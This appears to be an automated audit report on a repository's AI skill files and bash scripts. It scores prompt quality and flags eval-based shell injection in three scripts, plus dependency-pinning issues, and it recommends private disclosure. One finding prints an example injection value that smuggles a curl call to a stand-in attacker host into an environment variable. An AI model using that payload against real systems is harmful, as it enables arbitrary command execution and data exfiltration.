# NLPM Audit: breaking-brake/cc-wf-studio
**Date**: 2026-04-06  |  **Artifacts**: 8  |  **Strategy**: single
**NL Score**: 87/100
**Security**: BLOCKED
**Bugs**: 0  |  **Quality Issues**: 14  |  **Security Findings**: 5

## NL Score Summary
| File | Type | Score | Top Issue |
|------|------|-------|-----------|
| `.claude/skills/pr-to-main-cleanup/SKILL.md` | skill | 75 | No examples; no output format specification |
| `.claude/skills/jira-driven-planning/SKILL.md` | skill | 80 | No examples; Output Requirements is descriptive, not a format spec |
| `.claude/skills/pr-to-main/SKILL.md` | skill | 80 | No examples; PR body format not shown |
| `.github/skills/cc-workflow-ai-editor/SKILL.md` | skill | 88 | One domain-specific (Group Node) example; no user-facing output format; vague step |
| `.roo/skills/cc-workflow-ai-editor/SKILL.md` | skill | 88 | Identical to .github copy — same issues |
| `.claude/skills/pr-review-analysis/SKILL.md` | skill | 93 | One format-template example (placeholder values, no real data); severity assessment vague |
| `.claude/skills/pr-to-production/SKILL.md` | skill | 95 | Exemplary; "Categorize by type … etc." mildly imprecise |
| `CLAUDE.md` | context | 98 | "Follow standard conventions" in Code Style is vague |

**Weighted average**: (75 + 80 + 80 + 88 + 88 + 93 + 95 + 98) / 8 = **87/100**

## Security Scan
| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 3 |
| Medium | 1 |
| Low | 1 |

### Execution Surface Inventory
| Surface | Files |
|---------|-------|
| Hooks | None detected |
| Shell scripts | `.specify/scripts/bash/check-prerequisites.sh`, `.specify/scripts/bash/common.sh`, `.specify/scripts/bash/create-new-feature.sh`, `.specify/scripts/bash/setup-plan.sh`, `.specify/scripts/bash/update-agent-context.sh` |
| MCP configs | `.mcp.json` |
| Package manifests | `package.json` |

### Security Findings
| # | Severity | File | Line | Pattern | Description |
|---|----------|------|------|---------|-------------|
| 1 | High | `.specify/scripts/bash/check-prerequisites.sh` | 82 | eval-with-variables | `eval $(get_feature_paths)` expands SPECIFY_FEATURE env var inside single-quoted heredoc output; a crafted value (e.g. `x' ; curl attacker.com/$(id) ; FEATURE_DIR='`) can escape quoting and execute arbitrary shell commands |
| 2 | High | `.specify/scripts/bash/setup-plan.sh` | 31 | eval-with-variables | Same pattern: `eval $(get_feature_paths)` — same injection vector via SPECIFY_FEATURE |
| 3 | High | `.specify/scripts/bash/update-agent-context.sh` | 56 | eval-with-variables | Same pattern: `eval $(get_feature_paths)` — in CI/CD contexts the SPECIFY_FEATURE variable could be set by an external actor |
| 4 | Medium | `.mcp.json` | 4 | runtime-package-install | `npx -y mcp-remote` installs an unversioned npm package at runtime with auto-accept; supply chain compromise of `mcp-remote` would execute arbitrary code in the developer's environment |
| 5 | Low | `package.json` | 122–141 | unpinned-semver | All runtime and dev dependencies use caret ranges (`^`); unexpected minor-version updates can introduce breaking changes or vulnerabilities silently |

## Bugs (PR-worthy)
No bugs found. All referenced asset and template files exist on disk.

## Security Fixes (PR-worthy, Medium/Low only)
| # | File | Issue | Suggested Fix |
|---|------|-------|---------------|
| 1 | `.mcp.json` | `npx -y mcp-remote` installs latest unversioned package at runtime | Pin to a specific version: `"args": ["-y", "mcp-remote@0.x.y", "..."]` after auditing the package |
| 2 | `package.json` | Caret-range semver on all deps allows silent minor upgrades | Evaluate locking security-sensitive packages (`@modelcontextprotocol/sdk`, `@slack/web-api`) to exact versions or use `npm ci` with a committed lockfile in CI |

*High findings (#1–3 above) require private disclosure to the maintainer — do NOT open public PRs for those.*

## Quality Issues (informational)
| # | File | Issue | Penalty |
|---|------|-------|---------|
| 1 | `.claude/skills/jira-driven-planning/SKILL.md` | No example block showing invocation and expected AI output | -15 |
| 2 | `.claude/skills/jira-driven-planning/SKILL.md` | "Output Requirements" describes content, not format (no template or structure shown) | -5 |
| 3 | `.claude/skills/pr-to-main-cleanup/SKILL.md` | No example block | -15 |
| 4 | `.claude/skills/pr-to-main-cleanup/SKILL.md` | No output format spec — user doesn't know what success output looks like | -10 |
| 5 | `.claude/skills/pr-to-main/SKILL.md` | No example showing a full PR creation interaction | -15 |
| 6 | `.claude/skills/pr-to-main/SKILL.md` | PR body format not specified (only title length and language noted) | -5 |
| 7 | `.github/skills/cc-workflow-ai-editor/SKILL.md` | One example (Group Node JSON), domain-specific only; no full workflow input/output example | -5 |
| 8 | `.github/skills/cc-workflow-ai-editor/SKILL.md` | No user-facing output format — what should the agent say after applying changes? | -5 |
| 9 | `.github/skills/cc-workflow-ai-editor/SKILL.md` | Step 5: "Fix errors if any" — vague; what errors, what fixes? | -2 |
| 10 | `.roo/skills/cc-workflow-ai-editor/SKILL.md` | Identical to .github copy — same one-example limitation | -5 |
| 11 | `.roo/skills/cc-workflow-ai-editor/SKILL.md` | Same missing user-facing output format | -5 |
| 12 | `.roo/skills/cc-workflow-ai-editor/SKILL.md` | Same vague "Fix errors if any" | -2 |
| 13 | `.claude/skills/pr-review-analysis/SKILL.md` | Step 4 template uses placeholder values only; no real-data example | -5 |
| 14 | `.claude/skills/pr-review-analysis/SKILL.md` | Severity "レビューコメントのラベルまたは内容から推定する" ("infer from content") — criterion for content-based severity is unspecified | -2 |
| 15 | `CLAUDE.md` | "TypeScript 5.x … React 18.x … Follow standard conventions" — vague without linking to a lint config or style guide | -2 |

## Cross-Component
- **Intentional duplication**: `cc-workflow-ai-editor` SKILL.md is installed identically in both `.github/skills/` (for GitHub Copilot) and `.roo/skills/` (for Roo Code). This is by design for multi-agent support, but means any update must be applied in both locations. Recommend a canonical source with copy-on-build, or a symlink, to prevent drift.
- **CLAUDE.md architecture note**: The `## AI Editing Features` section correctly identifies `cc-workflow-ai-editor` as the primary AI editing interface and marks the chat-UI approach as discontinued. Consistent with the skill files — no contradiction found.
- **Asset files**: All skill-relative asset references resolve correctly (`assets/fix-template.md`, `assets/feat-template.md`, `assets/improvement-template.md`, `assets/pr-template.md`, `references/planning-template.md`).

## Recommendation
BLOCKED — do not submit PRs. File private security report.

Three High-severity shell injection vulnerabilities were found in `.specify/scripts/bash/` (`eval $(get_feature_paths)` in three scripts). While the practical attack surface is limited to local dev and CI/CD environments, a crafted `SPECIFY_FEATURE` environment variable can execute arbitrary shell commands. Disclose these privately to the maintainer before opening any PRs.

After the eval pattern is remediated (replace `eval $(get_feature_paths)` with individual `source`-safe assignments or a `declare`-based approach), the NL quality issues are suitable for a single PR bundling example blocks and output format specs across the five skills.
